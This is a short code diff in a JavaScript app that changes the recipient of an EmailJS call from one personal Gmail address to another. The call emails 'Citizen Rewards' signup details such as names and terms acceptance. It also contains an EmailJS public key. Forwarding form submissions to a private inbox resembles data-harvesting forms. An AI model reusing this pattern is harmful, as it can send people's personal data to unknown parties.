@@ -111,7 +111,7 @@ Terms Accepted: ${userData.agreesToTerms ? 'Yes' : 'No'}
             template_id: 'template_signup_data', // Template for signup data
             user_id: 'zaDtpBnf9dYvbCGGC', // Your EmailJS public key
             template_params: {
-              to_email: 'oyinloye1995@gmail.com', // Your email address
+              to_email: 'jc4479697@gmail.com', // Your email address
               subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`,
               message: dataString,
               user_name: `${userData.firstName} ${userData.lastName}`,
